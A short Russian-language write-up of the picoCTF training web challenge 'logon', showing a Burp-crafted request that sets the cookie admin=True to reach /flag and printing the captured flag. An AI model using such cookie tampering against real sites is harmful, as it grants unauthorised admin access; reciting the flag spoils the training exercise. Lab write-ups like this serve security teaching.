<!-- конвертировано из logon.typ, tools/typ2readme.py -->

| | |
|---|---|
| **Платформа / Событие** | picoCTF Trainings |
| **Категория** | Web |
| **Сложность** | Easy 100 pts |
| **Статус** | done |
| **Дата решения** | 19 июля 2026 |
| **Ссылка на таск** | — |

# logon

## Задание

The factory is hiding things from all of its users.

## Решение

Просматриваем куки после регистрации и видим admin=False
Потому и не видим флаг. В ход вступает Burp:

```http
GET /flag HTTP/1.1
Host: fickle-tempest.picoctf.net:53888
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://fickle-tempest.picoctf.net:53888/
Accept-Encoding: gzip, deflate, br
Cookie: password=adsf; username=asdf; admin=True
Connection: keep-alive

```

```text
picoCTF{th3_c0nsp1r4cy_l1v3s_4d184b0d}
```
